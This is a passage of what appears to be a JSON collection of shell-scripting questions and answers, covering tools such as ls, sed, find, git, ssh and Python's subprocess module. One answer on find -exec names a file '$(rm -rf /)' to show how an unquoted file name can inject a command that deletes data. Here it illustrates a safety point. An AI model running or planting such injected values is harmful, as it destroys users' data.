conventions: all cmdlets are named Action-Object and moreover, there are also standardized names for specific actions and specific objects. (Again, this should sound familar to OS/400 users.) For example, everything which is related to receiving some information is called Get-Foo. And everything operating on (sub-)objects is called Bar-ChildItem. So, the equivalent to ls is Get-ChildItem (although PowerShell also provides builtin aliases ls and dir \u2013 in fact, whenever it makes sense, they provide both Unix and CMD.EXE aliases as well as abbreviations (gci in this case)).\nBut the killer feature IMO is the strongly typed object pipelines. While PowerShell is derived from the Unix shell, there is one very important distinction: in Unix, all communication (both via pipes and redirections as well as via command arguments) is done with untyped, unstructured strings. In PowerShell, it's all strongly typed, structured objects. This is so incredibly powerful that I seriously wonder why noone else has thought of it. (Well, they have, but they never became popular.) In my shell scripts, I estimate that up to one third of the commands is only there to act as an adapter between two other commands that don't agree on a common textual format. Many of those adapters go away in PowerShell, because the cmdlets exchange structured objects instead of unstructured text. And if you look inside the commands, then they pretty much consist of three stages: parse the textual input into an internal object representation, manipulate the objects, convert them back into text. Again, the first and third stage basically go away, because the data already comes in as objects.\nHowever, the designers have taken great care to preserve the dynamicity and flexibility of shell scripting through what they call an Adaptive Type System.\nAnyway, I don't want to turn this into a PowerShell commercial. There are plenty of things that are not so great about PowerShell, although most of those have to do either with Windows or with the specific implementation, and not so much with the concepts. (E.g. the fact that it is implemented in .NET means that the very first time you start up the shell can take up to several seconds if the .NET framework is not already in the filesystem cache due to some other application that needs it. Considering that you often use the shell for well under a second, that is completely unacceptable.)\nThe most important point I want to make is that if you want to look at existing work in scripting languages and shells, you shouldn't stop at Unix and the Ruby/Python/Perl/PHP family. For example, Tcl was already mentioned. Rexx would be another scripting language. Emacs Lisp would be yet another. And in the shell realm there are some of the already mentioned mainframe/midrange shells such as the OS/400 command line and DCL. Also, Plan9's rc.",
    "How do I list one filename per output line in Linux?": "Use the -1 option (note this is a \"one\" digit, not a lowercase letter \"L\"), like this:\nls -1a\nFirst, though, make sure your ls supports -1. GNU coreutils (installed on standard Linux systems) and Solaris do; but if in doubt, use man ls or ls --help or check the documentation. E.g.:\n$ man ls\n...\n       -1     list one file per line.  Avoid '\\n' with -q or -b",
    "How can I ssh directly to a particular directory?": "You can do the following:\nssh -t xxx.xxx.xxx.xxx \"cd /directory_wanted ; bash --login\"\nThis way, you will get a login shell right on the directory_wanted.\nExplanation\n-t Force pseudo-terminal allocation. This can be used to execute arbitrary screen-based programs on a remote machine, which can be very useful, e.g. when implementing menu services.\nMultiple -t options force tty allocation, even if ssh has no local tty.\nIf you don't use -t then no prompt will appear.\nIf you don't add ; bash then the connection will get closed and return control to your local machine\nIf you don't add bash --login then it will not use your configs because it's not a login shell",
    "Why do you need ./ (dot-slash) before executable or script name to run it in bash?": "Because on Unix, usually, the current directory is not in $PATH.\nWhen you type a command the shell looks up a list of directories, as specified by the PATH variable. The current directory is not in that list.\nThe reason for not having the current directory on that list is security.\nLet's say you're root and go into another user's directory and type sl instead of ls. If the current directory is in PATH, the shell will try to execute the sl program in that directory (since there is no other sl program). That sl program might be malicious.\nIt works with ./ because POSIX specifies that a command name that contain a / will be used as a filename directly, suppressing a search in $PATH. You could have used full path for the exact same effect, but ./ is shorter and easier to write.\nEDIT\nThat sl part was just an example. The directories in PATH are searched sequentially and when a match is made that program is executed. So, depending on how PATH looks, typing a normal command may or may not be enough to run the program in the current directory.",
    "vim: how to delete a newline/linefeed character(s)?": "If you are on the first line, pressing (upper case) J will join that line and the next line together, removing the newline. You can also combine this with a count, so pressing 3J will combine all 3 lines together.",
    "Getting the last argument passed to a shell script": "This is Bash-only:\necho \"${@: -1}\"",
    "Meaning of $? (dollar question mark) in shell scripts": "This is the exit status of the last executed command.\nFor example the command true always returns a status of 0 and false always returns a status of 1:\ntrue\necho $? # echoes 0\nfalse\necho $? # echoes 1\nFrom the manual: (acessible by calling man bash in your shell)\n?       Expands to the exit status of the most recently executed foreground pipeline.\nBy convention an exit status of 0 means success, and non-zero return status means failure. Learn more about exit statuses on wikipedia.\nThere are other special variables like this, as you can see on this online manual: https://www.gnu.org/s/bash/manual/bash.html#Special-Parameters",
    "How can I shuffle the lines of a text file on the Unix command line or in a shell script?": "You can use shuf. On some systems at least (doesn't appear to be in POSIX).\nAs jleedev pointed out: sort -R might also be an option. On some systems at least; well, you get the picture. It has been pointed out that sort -R doesn't really shuffle but instead sort items according to their hash value.\n[Editor's note: sort -R almost shuffles, except that duplicate lines / sort keys always end up next to each other. In other words: only with unique input lines / keys is it a true shuffle. While it's true that the output order is determined by hash values, the randomness comes from choosing a random hash function - see manual.]",
    "Insert line after match using sed": "Try doing this using GNU sed:\nsed '/CLIENTSCRIPT=\"foo\"/a CLIENTSCRIPT2=\"hello\"' file\nif you want to substitute in-place, use\nsed -i '/CLIENTSCRIPT=\"foo\"/a CLIENTSCRIPT2=\"hello\"' file\nOutput\nCLIENTSCRIPT=\"foo\"\nCLIENTSCRIPT2=\"hello\"\nCLIENTFILE=\"bar\"\nDoc\nsee sed doc and search \\a (append)",
    "How to kill all processes matching a name?": "From man 1 pkill\n-f     The pattern is normally only matched against the process name.\n       When -f is set, the full command line is used.\nWhich means, for example, if we see these lines in ps aux:\napache   24268  0.0  2.6 388152 27116 ?        S    Jun13   0:10 /usr/sbin/httpd\napache   24272  0.0  2.6 387944 27104 ?        S    Jun13   0:09 /usr/sbin/httpd\napache   24319  0.0  2.6 387884 27316 ?        S    Jun15   0:04 /usr/sbin/httpd\nWe can kill them all using the pkill -f option:\npkill -f httpd",
    "Save file to specific folder with curl command": "I don't think you can give a path to curl, but you can CD to the location, download and CD back.\ncd target/path && { curl -O URL ; cd -; }\nOr using subshell.\n(cd target/path && curl -O URL)\nBoth ways will only download if path exists. -O keeps remote file name. After download it will return to original location.\nIf you need to set filename explicitly, you can use small -o option:\ncurl -o target/path/filename URL",
    "What is the $? (dollar question mark) variable in shell scripting? [duplicate]": "$? is used to find the return value of the last executed command. Try the following in the shell:\nls somefile\necho $?\nIf somefile exists (regardless whether it is a file or directory), you will get the return value thrown by the ls command, which should be 0 (default \"success\" return value). If it doesn't exist, you should get a number other then 0. The exact number depends on the program.\nFor many programs you can find the numbers and their meaning in the corresponding man page. These will usually be described as \"exit status\" and may have their own section.",
    "Get most recent file in a directory on Linux": "ls -Art | tail -n 1\nThis will return the latest modified file or directory. Not very elegant, but it works.\nUsed flags:\n-A list all files except . and ..\n-r reverse order while sorting\n-t sort by time, newest first",
    "Environment variable substitution in sed": "Your two examples look identical, which makes problems hard to diagnose. Potential problems:\nYou may need double quotes, as in sed 's/xxx/'\"$PWD\"'/'\n$PWD may contain a slash, in which case you need to find a character not contained in $PWD to use as a delimiter.\nTo nail both issues at once, perhaps\nsed 's@xxx@'\"$PWD\"'@'",
    "How to programmatically determine the current checked out Git branch [duplicate]": "The correct solution is to take a peek at contrib/completions/git-completion.bash does that for bash prompt in __git_ps1. Removing all extras like selecting how to describe detached HEAD situation, i.e. when we are on unnamed branch, it is:\nbranch_name=\"$(git symbolic-ref HEAD 2>/dev/null)\" ||\nbranch_name=\"(unnamed branch)\"     # detached HEAD\n\nbranch_name=${branch_name##refs/heads/}\ngit symbolic-ref is used to extract fully qualified branch name from symbolic reference; we use it for HEAD, which is currently checked out branch.\nAlternate solution could be:\nbranch_name=$(git symbolic-ref -q HEAD)\nbranch_name=${branch_name##refs/heads/}\nbranch_name=${branch_name:-HEAD}\nwhere in last line we deal with the detached HEAD situation, using simply \"HEAD\" to denote such situation.\nAdded 11-06-2013\nJunio C. Hamano (git maintainer) blog post, Checking the current branch programatically, from June 10, 2013 explains whys (and hows) in more detail.",
    "When to wrap quotes around a shell variable?": "General rule: quote it if it can either be empty or contain spaces (or any whitespace really) or special characters (wildcards). Not quoting strings with spaces often leads to the shell breaking apart a single argument into many.\n$? doesn't need quotes since it's a numeric value. Whether $URL needs it depends on what you allow in there and whether you still want an argument if it's empty.\nI tend to always quote strings just out of habit since it's safer that way.",
    "What is the difference between $(command) and `command` in shell programming?": "The backticks/gravemarks have been deprecated in favor of $() for command substitution because $() can easily nest within itself as in $(echo foo$(echo bar)). There are other differences such as how backslashes are parsed in the backtick/gravemark version, etc.\nSee BashFAQ/082 for several reasons to always prefer the $(...) syntax.\nAlso see the POSIX spec for detailed information on the various differences.",
    "How to sort a file in-place?": "You can use the -o, --output=FILE option of sort to indicate the same input and output file:\nsort -o file file\nWithout repeating the filename (with bash brace expansion)\nsort -o file{,}\n\u26a0\ufe0f Important note: a common mistake is to try to redirect the output to the same input file (e.g. sort file > file). This does not work as the shell is making the redirections (not the sort(1) program) and the input file (as being the output also) will be erased just before giving the sort(1) program the opportunity of reading it.",
    "How to pass command line arguments to a shell alias? [duplicate]": "Just to reiterate what has been posted for other shells, in Bash the following works:\nalias blah='function _blah(){ echo \"First: $1\"; echo \"Second: $2\"; };_blah'\nRunning the following:\nblah one two\nGives the output below:\nFirst: one\nSecond: two",
    "How do I list the functions defined in my shell? [duplicate]": "declare -F\nFunction names and definitions may be listed with the -f option to the declare builtin command (see Bash Builtins). The -F option to declare will list the function names only (and optionally the source file and line number).\nBash Reference Manual",
    "How to check if a file exists in a shell script": "You're missing a required space between the bracket and -e:\n#!/bin/bash\nif [ -e x.txt ]\nthen\n    echo \"ok\"\nelse\n    echo \"nok\"\nfi",
    "find: missing argument to -exec": "A -exec command must be terminated with a ; (so you usually need to type \\; or ';' to avoid interpretion by the shell) or a +. The difference is that with ;, the command is called once per file, with +, it is called just as few times as possible (usually once, but there is a maximum length for a command line, so it might be split up) with all filenames. See this example:\n$ cat /tmp/echoargs\n#!/bin/sh\necho $1 - $2 - $3\n$ find /tmp/foo -exec /tmp/echoargs {} \\;\n/tmp/foo - -\n/tmp/foo/one - -\n/tmp/foo/two - -\n$ find /tmp/foo -exec /tmp/echoargs {} +\n/tmp/foo - /tmp/foo/one - /tmp/foo/two\nYour command has two errors:\nFirst, you use {};, but the ; must be a parameter of its own.\nSecond, the command ends at the &&. You specified \u201crun find, and if that was successful, remove the file named {};.\u201c. If you want to use shell stuff in the -exec command, you need to explicitly run it in a shell, such as -exec sh -c 'ffmpeg ... && rm'.\nHowever you should not add the {} inside the bash command, it will produce problems when there are special characters. Instead, you can pass additional parameters to the shell after -c command_string (see man sh):\n$ ls\n$(echo damn.)\n$ find * -exec sh -c 'echo \"{}\"' \\;\ndamn.\n$ find * -exec sh -c 'echo \"$1\"' - {} \\;\n$(echo damn.)\nYou see the $ thing is evaluated by the shell in the first example. Imagine there was a file called $(rm -rf /) :-)\n(Side note: The - is not needed, but the first variable after the command is assigned to the variable $0, which is a special variable normally containing the name of the program being run and setting that to a parameter is a little unclean, though it won't cause any harm here probably, so we set that to just - and start with $1.)\nSo your command could be something like\nfind -exec bash -c 'ffmpeg -i \"$1\" -sameq \"$1\".mp3 && rm \"$1\".mp3' - {} \\;\nBut there is a better way. find supports and and or, so you may do stuff like find -name foo -or -name bar. But that also works with -exec, which evaluates to true if the command exits successfully, and to false if not. See this example:\n$ ls\nfalse  true\n$ find * -exec {} \\; -and -print\ntrue\nIt only runs the print if the command was successfully, which it did for true but not for false.\nSo you can use two exec statements chained with an -and, and it will only execute the latter if the former was run successfully.",
    "source command not found in sh shell": "/bin/sh is usually some other shell trying to mimic The Shell. Many distributions use /bin/bash for sh, it supports source. On Ubuntu, though, /bin/dash is used which does not support source. Most shells use . instead of source. If you cannot edit the script, try to change the shell which runs it.",
    "Returning a boolean from a Bash function": "Use 0 for true and 1 for false.\nSample:\n#!/bin/bash\n\nisdirectory() {\n  if [ -d \"$1\" ]\n  then\n    # 0 = true\n    return 0 \n  else\n    # 1 = false\n    return 1\n  fi\n}\n\n\nif isdirectory $1; then echo \"is directory\"; else echo \"nopes\"; fi\nEdit\nFrom @amichair's comment, these are also possible\nisdirectory() {\n  if [ -d \"$1\" ]\n  then\n    true\n  else\n    false\n  fi\n}\n\n\nisdirectory() {\n  [ -d \"$1\" ]\n}",
    "Sorting data based on second column of a file": "You can use the key option of the sort command, which takes a \"field number\", so if you wanted the second column:\nsort -k2 -n yourfile\n-n, --numeric-sort compare according to string numerical value\nFor example:\n$ cat ages.txt \nBob 12\nJane 48\nMark 3\nTashi 54\n\n$ sort -k2 -n ages.txt \nMark 3\nBob 12\nJane 48\nTashi 54",
    "Which characters need to be escaped when using Bash?": "There are two easy and safe rules which work not only in sh but also bash.\n1. Put the whole string in single quotes\nThis works for all chars except single quote itself. To escape the single quote, close the quoting before it, insert the single quote, and re-open the quoting.\n'I'\\''m a s@fe $tring which ends in newline\n'\nsed command: sed -e \"s/'/'\\\\\\\\''/g; 1s/^/'/; \\$s/\\$/'/\"\n2. Escape every char with a backslash\nThis works for all characters except newline. For newline characters use single or double quotes. Empty strings must still be handled - replace with \"\"\n\\I\\'\\m\\ \\a\\ \\s\\@\\f\\e\\ \\$\\t\\r\\i\\n\\g\\ \\w\\h\\i\\c\\h\\ \\e\\n\\d\\s\\ \\i\\n\\ \\n\\e\\w\\l\\i\\n\\e\"\n\"\nsed command: sed -e 's/./\\\\&/g; 1{$s/^$/\"\"/}; 1!s/^/\"/; $!s/$/\"/'.\n2b. More readable version of 2\nThere's an easy safe set of characters, like [a-zA-Z0-9,._+:@%/-], which can be left unescaped to keep it more readable\nI\\'m\\ a\\ s@fe\\ \\$tring\\ which\\ ends\\ in\\ newline\"\n\"\nsed command: LC_ALL=C sed -e 's/[^a-zA-Z0-9,._+@%/-]/\\\\&/g; 1{$s/^$/\"\"/}; 1!s/^/\"/; $!s/$/\"/'.\nNote that in a sed program, one can't know whether the last line of input ends with a newline byte (except when it's empty). That's why both above sed commands assume it does not. You can add a quoted newline manually.\nNote that shell variables are only defined for text in the POSIX sense. Processing binary data is not defined. For the implementations that matter, binary works with the exception of NUL bytes (because variables are implemented with C strings, and meant to be used as C strings, namely program arguments), but you should switch to a \"binary\" locale such as latin1.\n(You can easily validate the rules by reading the POSIX spec for sh. For bash, check the reference manual linked by @AustinPhillips)",
    "Access mysql remote database from command line": "To directly login to a remote mysql console, use the below command:\nmysql -u {username} -p'{password}' \\\n    -h {remote server ip or name} -P {port} \\\n    -D {DB name}\nFor example\nmysql -u root -p'root' \\\n        -h 127.0.0.1 -P 3306 \\\n        -D local\nno space after -p as specified in the Using Options on the Command Line documentation\nIt will take you to the mysql console directly by switching to the mentioned database.",
    "How to call a shell script from python code?": "The subprocess module will help you out.\nBlatantly trivial example:\n>>> import subprocess\n>>> subprocess.call(['sh', './test.sh']) # Thanks @Jim Dennis for suggesting the []\n0 \n>>> \nWhere test.sh is a simple shell script and 0 is its return value for this run.",
    "Is there a \"goto\" statement in bash?": "No. But, if you are using it to skip part of a large script for debugging (see Karl Nicoll's comment), then if false could be a good workaround.\n# ... Code I want to run here ...\n\nif false; then\n\n# ... Code I want to skip here ...\n\nfi\n\n# ... I want to resume here ...\nThe difficulty comes in when it's time to rip out your debugging code. The if false construct is pretty straightforward and memorable, but how do you find the matching fi? If your editor allows you to block indent, you could indent the skipped block (then you'll want to put it back when you're done). Or a comment on the fi line, but it would have to be something you'll remember, which I suspect will be very programmer-dependent.",
    "live output from subprocess command": "TLDR for Python 3:\nimport subprocess\nimport sys\n\nwith open(\"test.log\", \"wb\") as f:\n    process = subprocess.Popen(your_command, stdout=subprocess.PIPE)\n    for c in iter(lambda: process.stdout.read(1), b\"\"):\n        sys.stdout.buffer.write(c)\n        f.buffer.write(c)\nYou have two ways of doing this, either by creating an iterator from the read or readline functions and do:\nimport subprocess\nimport sys\n\n# replace \"w\" with \"wb\" for Python 3\nwith open(\"test.log\", \"w\") as f:\n    process = subprocess.Popen(your_command, stdout=subprocess.PIPE)\n    # replace \"\" with b'' for Python 3\n    for c in iter(lambda: process.stdout.read(1), \"\"):\n        sys.stdout.write(c)\n        f.write(c)\nor\nimport subprocess\nimport sys\n\n# replace \"w\" with \"wb\" for Python 3\nwith open(\"test.log\", \"w\") as f:\n    process = subprocess.Popen(your_command, stdout=subprocess.PIPE)\n    # replace \"\" with b\"\" for Python 3\n    for line in iter(process.stdout.readline, \"\"):\n        sys.stdout.write(line)\n        f.write(line)\nOr you can create a reader and a writer file. Pass the writer to the Popen and read from the reader\nimport io\nimport time\nimport subprocess\nimport sys\n\nfilename = \"test.log\"\nwith io.open(filename, \"wb\") as writer, io.open(filename, \"rb\", 1) as reader:\n    process = subprocess.Popen(command, stdout=writer)\n    while process.poll() is None:\n        sys.stdout.write(reader.read())\n        time.sleep(0.5)\n    # Read the remaining\n    sys.stdout.write(reader.read())\nThis way you will have the data written in the test.log as well as on the standard output.\nThe only advantage of the file approach is that your code doesn't block. So you can do whatever you want in the meantime and read whenever you want from the reader in a non-blocking way. When you use PIPE, read and readline functions will block until either one character is written to the pipe or a line is written to the pipe respectively.",
    "Unzip All Files In A Directory": "This works in bash, according to this link:\nunzip \\*.zip",
    "How can I convert tabs to spaces in every file of a directory?": "Simple replacement with sed is okay but not the best possible solution. If there are \"extra\" spaces between the tabs they will still be there after substitution, so the margins will be ragged. Tabs expanded in the middle of lines will also not work correctly. In bash, we can say instead\nfind . -name '*.java' ! -type d -exec bash -c 'expand -t 4 \"$0\" > /tmp/e && mv /tmp/e \"$0\"' {} \\;\nto apply expand to every Java file in the current directory tree. Remove / replace the -name argument if you're targeting some other file types. As one of the comments mentions, be very careful when removing -name or using a weak, wildcard. You can easily clobber repository and other hidden files without intent. This is why the original answer included this:\nYou should always make a backup copy of the tree before trying something like this in case something goes wrong.",
    "What is the proper way to test if a parameter is empty in a batch file?": "Use square brackets instead of quotation marks:\nIF [%1] == [] GOTO MyLabel\nParentheses are insecure: only use square brackets.",
    "Correct Bash and shell script variable capitalization [closed]": "By convention, environment variables (PAGER, EDITOR, ...) and internal shell variables (SHELL, BASH_VERSION, ...) are capitalized. All other variable names should be lower case.\nRemember that variable names are case-sensitive; this convention avoids accidentally overriding environmental and internal variables.\nKeeping to this convention, you can rest assured that you don't need to know every environment variable used by UNIX tools or shells in order to avoid overwriting them. If it's your variable, lowercase it. If you export it, uppercase it.",
    "How to pipe stdout while keeping it on screen ? (and not to a output file)": "Here is a solution that works at on any Unix / Linux implementation, assuming it cares to follow the POSIX standard. It works on some non Unix environments like cygwin too.\necho 'ee' | tee /dev/tty | foo\nReference: The Open Group Base Specifications Issue 7 IEEE Std 1003.1, 2013 Edition, \u00a710.1:\n/dev/tty\nAssociated with the process group of that process, if any. It is useful for programs or shell procedures that wish to be sure of writing messages to or reading data from the terminal no matter how output has been redirected. It can also be used for applications that demand the name of a file for output, when typed output is desired and it is tiresome to find out what terminal is currently in use. In each process, a synonym for the controlling terminal\nSome environments like Google Colab have been reported not to implement /dev/tty while still having their tty command returning a usable device. Here is a workaround:\ntty=$(tty)\necho 'ee' | tee $tty | foo\nor with an ancient Bourne shell:\ntty=`tty`\necho 'ee' | tee $tty | foo",
    "How do I run multiple background commands in bash in a single line?": "Exactly how do you want them to run? If you want them to be started in the background and run sequentially, you would do something like this:\n{ sleep 2; sleep 3; } &\nIf you want sleep 3 to run only if sleep 2 succeeds, then:\nsleep 2 && sleep 3 &\nIf, on the other hand, you would like them to run in parallel in the background, you can instead do this:\nsleep 2 & sleep 3 &\nAnd the two techniques could be combined, such as:\n{ sleep 2; echo first finished; } & { sleep 3; echo second finished; } &\nBash being bash, there's often a multitude of different techniques to accomplish the same task, although sometimes with subtle differences between them.",
    "What are the uses of the exec command in shell scripts? [closed]": "The exec built-in command mirrors functions in the kernel, there are a family of them based on execve, which is usually called from C.\nexec replaces the current program in the current process, without forking a new process. It is not something you would use in every script you write, but it comes in handy on occasion. Here are some scenarios I have used it;\nWe want the user to run a specific application program without access to the shell. We could change the sign-in program in /etc/passwd, but maybe we want environment setting to be used from start-up files. So, in (say) .profile, the last statement says something like:\n exec appln-program\nso now there is no shell to go back to. Even if appln-program crashes, the end-user cannot get to a shell, because it is not there - the exec replaced it.\nWe want to use a different shell to the one in /etc/passwd. Stupid as it may seem, some sites do not allow users to alter their sign-in shell. One site I know had everyone start with csh, and everyone just put into their .login (csh start-up file) a call to ksh. While that worked, it left a stray csh process running, and the logout was two stage which could get confusing. So we changed it to exec ksh which just replaced the c-shell program with the korn shell, and made everything simpler (there are other issues with this, such as the fact that the ksh is not a login-shell).\nJust to save processes. If we call prog1 -> prog2 -> prog3 -> prog4 etc. and never go back, then make each call an exec. It saves resources (not much, admittedly, unless repeated) and makes shutdown simplier.\nYou have obviously seen exec used somewhere, perhaps if you showed the code that's bugging you we could justify its use.\nEdit: I realised that my answer above is incomplete. There are two uses of exec in shells like ksh and bash - used for opening file descriptors. Here are some examples:\nexec 3< thisfile          # open \"thisfile\" for reading on file descriptor 3\nexec 4> thatfile          # open \"thatfile\" for writing on file descriptor 4\nexec 8<> tother           # open \"tother\" for reading and writing on fd 8\nexec 6>> other            # open \"other\" for appending on file descriptor 6\nexec 5<&0                 # copy read file descriptor 0 onto file descriptor 5\nexec 7>&4                 # copy write file descriptor 4 onto 7\nexec 3<&-                 # close the read file descriptor 3\nexec 6>&-                 # close the write file descriptor 6\nNote that spacing is very important here. If you place a space between the fd number and the redirection symbol then exec reverts to the original meaning:\n  exec 3 < thisfile       # oops, overwrite the current program with command \"3\"\nThere are several ways you can use these, on ksh use read -u or print -u, on bash, for example:\nread <&3\necho stuff >&4",
    "How do you normalize a file path in Bash?": "if you're wanting to chomp part of a filename from the path, \"dirname\" and \"basename\" are your friends, and \"realpath\" is handy too.\ndirname /foo/bar/baz \n# /foo/bar \nbasename /foo/bar/baz\n# baz\ndirname $( dirname  /foo/bar/baz  ) \n# /foo \nrealpath ../foo\n# ../foo: No such file or directory\nrealpath /tmp/../tmp/../tmp\n# /tmp\nrealpath alternatives\nIf realpath is not supported by your shell, you can try\nreadlink -f /path/here/.. \nAlso\nreadlink -m /path/there/../../ \nWorks the same as\nrealpath -s /path/here/../../\nin that the path doesn't need to exist to be normalized.",
    "How to read a space-delimited string into an array in Bash?": "In order to convert a string into an array, create an array from the string, letting the string get split naturally according to the IFS (Internal Field Separator) variable, which is the space char by default:\narr=($line)\nor pass the string to the stdin of the read command using the herestring (<<<) operator:\nread -a arr <<< \"$line\"\nFor the first example, it is crucial not to use quotes around $line since that is what allows the string to get split into multiple elements.\nSee also: https://github.com/koalaman/shellcheck/wiki/SC2206",
    "How to get the list of files in a directory in a shell script?": "search_dir=/the/path/to/base/dir\nfor entry in \"$search_dir\"/*\ndo\n  echo \"$entry\"\ndone",
    "Checking for a dirty index or untracked files with Git": "The key to reliably \u201cscripting\u201d Git is to use the \u2018plumbing\u2019 commands.\nThe developers take care when changing the plumbing commands to make sure they provide very stable interfaces (i.e. a given combination of repository state, stdin, command line options, arguments, etc. will produce the same output in all versions of Git where the command/option exists). New output variations in plumbing commands can be introduced via new options, but that can not introduce any problems for programs that have already been written against older versions (they would not be using the new options, since they did not exist (or at least were not used) at the time the script was written).\nUnfortunately the \u2018everyday\u2019 Git commands are the \u2018porcelain\u2019 commands, so most Git users may not be familiar with with the plumbing commands. The distinction between porcelain and plumbing command is made in the main git manpage (see subsections titled High-level commands (porcelain) and Low-level commands (plumbing).\nTo find out about uncomitted changes, you will likely need git diff-index (compare index (and maybe tracked bits of working tree) against some other treeish (e.g. HEAD)), maybe git diff-files (compare working tree against index), and possibly git ls-files (list files; e.g. list untracked, unignored files).\n(Note that in the below commands, HEAD -- is used instead of HEAD because otherwise the command fails if there is a file named HEAD.)\nTo check whether a repository has staged changes (not yet committed) use this:\ngit diff-index --quiet --cached HEAD --\nIf it exits with 0 then there were no differences (1 means there were differences).\nTo check whether a working tree has changes that could be staged:\ngit diff-files --quiet\nThe exit code is the same as for git diff-index (0 == no differences; 1 == differences).\nTo check whether the combination of the index and the tracked files in the working tree have changes with respect to HEAD:\ngit diff-index --quiet HEAD --\nThis is like a combination of the previous two. One prime difference is that it will still report \u201cno differences\u201d if you have a staged change that you have \u201cundone\u201d in the working tree (gone back to the contents that are in HEAD). In this same situation, the two separate commands would both return reports of \u201cdifferences present\u201d.\nYou also mentioned untracked files. You might mean \u201cuntracked and unignored\u201d, or you might mean just plain \u201cuntracked\u201d (including ignored files). Either way, git ls-files is the tool for the job:\nFor \u201cuntracked\u201d (will include ignored files, if present):\ngit ls-files --others\nFor \u201cuntracked and unignored\u201d:\ngit ls-files --exclude-standard --others\nMy first thought is to just check whether these commands have output:\ntest -z \"$(git ls-files --others)\"\nIf it exits with 0 then there are no untracked files. If it exits with 1 then there are untracked files.\nThere is a small chance that this will translate abnormal exits from git ls-files into \u201cno untracked files\u201d reports (both result in non-zero exits of the above command). A bit more robust version might look like this:\nu=\"$(git ls-files --others)\" && test -z \"$u\"\nThe idea is the same as the previous command, but it allows unexpected errors from git ls-files to propagate out. In this case a non-zero exit could mean \u201cthere are untracked files\u201d or it could mean an error occurred. If you want the \u201cerror\u201d results combined with the \u201cno untracked files\u201d result instead, use test -n \"$u\" (where exit of 0 means \u201csome untracked files\u201d, and non-zero means error or \u201cno untracked files\u201d).\nAnother idea is to use --error-unmatch to cause a non-zero exit when there are no untracked files. This also runs the risk of conflating \u201cno untracked files\u201d (exit 1) with \u201can error occurred\u201d (exit non-zero, but probably 128). But checking for 0 vs. 1 vs. non-zero exit codes is probably fairly robust:\ngit ls-files --others --error-unmatch . >/dev/null 2>&1; ec=$?\nif test \"$ec\" = 0; then\n    echo some untracked files\nelif test \"$ec\" = 1; then\n    echo no untracked files\nelse\n    echo error from ls-files\nfi\nAny of the above git ls-files examples can take --exclude-standard if you want to consider only untracked and unignored files.",
    "Define an alias in fish shell": "Just use alias. Here's a basic example:\n# Define alias in shell\nalias rmi \"rm -i\"\n\n# Define alias in config file ( `~/.config/fish/config.fish` )\nalias rmi=\"rm -i\"\n\n# This is equivalent to entering the following function:\nfunction rmi\n    rm -i $argv\nend\n\n# Then, to save it across terminal sessions:\nfuncsave rmi\n\n# or, since Fish 3.0, define and save all at once:\nalias --save rmi=\"rm -i\"\nThe command funcsave creates the file ~/.config/fish/functions/rmi.fish. This is handled automatically when using the newer alias --save syntax.\nMore info about Fish aliases can be found in the official manual.",
    "docker entrypoint running bash script gets \"permission denied\" [duplicate]": "\"Permission denied\" prevents your script from being invoked at all. Thus, the only syntax that could be possibly pertinent is that of the first line (the \"shebang\"), which should look like #!/usr/bin/env bash, or #!/bin/bash, or similar depending on your target's filesystem layout.\nMost likely the filesystem permissions not being set to allow execute. It's also possible that the shebang references something that isn't executable, but this is far less likely.\nMooted by the ease of repairing the prior issues.\nThe simple reading of\ndocker: Error response from daemon: oci runtime error: exec: \"/usr/src/app/docker-entrypoint.sh\": permission denied.\n...is that the script isn't marked executable.\nRUN [\"chmod\", \"+x\", \"/usr/src/app/docker-entrypoint.sh\"]\nwill address this within the container. Alternately, you can ensure that the local copy referenced by the Dockerfile is executable, and then use COPY (which is explicitly documented to retain metadata).",
    "Read a variable in bash with a default value": "You can use parameter expansion, e.g.\nread -p \"Enter your name [Richard]: \" name\nname=${name:-Richard}\necho $name\nIncluding the default value in the prompt between brackets is a fairly common convention\nWhat does the :-Richard part do? From the bash manual:\n${parameter:-word} If parameter is unset or null, the expansion of word is substituted. Otherwise, the value of parameter is substituted.\nAlso worth noting that...\nIn each of the cases below, word is subject to tilde expansion, parameter expansion, command substitution, and arithmetic expansion.\nSo if you use webpath=${webpath:-~/httpdocs} you will get a result of /home/user/expanded/path/httpdocs not ~/httpdocs, etc.",
    "find without recursion": "I think you'll get what you want with the -maxdepth 1 option, based on your current command structure. If not, you can try looking at the man page for find.\nRelevant entry (for convenience's sake):\n-maxdepth levels\n          Descend at most levels (a non-negative integer) levels of direc-\n          tories below the command line arguments.   `-maxdepth  0'  means\n          only  apply the tests and actions to the command line arguments.\nYour options basically are:\n# Do NOT show hidden files (beginning with \".\", i.e., .*):\nfind DirsRoot/* -maxdepth 0 -type f\nOr:\n#  DO show hidden files:\nfind DirsRoot/ -maxdepth 1 -type f",
    "Random number from a range in a Bash Script": "shuf -i 2000-65000 -n 1\nEnjoy!\nEdit: The range is inclusive.",
    "How to redirect output of an entire shell script within the script itself?": "Addressing the question as updated.\n#...part of script without redirection...\n\n{\n    #...part of script with redirection...\n} > file1 2>file2 # ...and others as appropriate...\n\n#...residue of script without redirection...\nThe braces '{ ... }' provide a unit of I/O redirection. The braces must appear where a command could appear - simplistically, at the start of a line or after a semi-colon. (Yes, that can be made more precise; if you want to quibble, let me know.)\nYou are right that you can preserve the original stdout and stderr with the redirections you showed, but it is usually simpler for the people who have to maintain the script later to understand what's going on if you scope the redirected code as shown above.\nThe relevant sections of the Bash manual are Grouping Commands and I/O Redirection. The relevant sections of the POSIX shell specification are Compound Commands and I/O Redirection. Bash has some extra notations, but is otherwise similar to the POSIX shell specification.",
    "How can I remove the extension of a filename in a shell script?": "You can also use parameter expansion:\n$ filename=foo.txt\n$ echo \"${filename%.*}\"\nfoo\nIf you have a filepath and not just a filename, you'll want to use basename first to get just the filename including the extension. Otherwise, if there's a dot only in the path (e.g. path.to/myfile or ./myfile), then it will trim inside the path; even if there isn't a dot in the path, it will get the (e.g. path/to/myfile if the path is path/to/myfile.txt):\n$ filepath=path.to/foo.txt\n$ echo \"${filepath%.*}\"\npath.to/foo\n$ filename=$(basename $filepath)\n$ echo $filename\nfoo.txt\n$ echo \"${filename%.*}\"\nfoo\nJust be aware that if the filename only starts with a dot (e.g. .bashrc) it will remove the whole filename.",
    "How do I run a shell script without using \"sh\" or \"bash\" commands?": "Add a \"shebang\" at the top of your file:\n#!/bin/bash\nAnd make your file executable (chmod +x script.sh).\nFinally, modify your path to add the directory where your script is located:\nexport PATH=$PATH:/appropriate/directory\n(typically, you want $HOME/bin for storing your own scripts)",
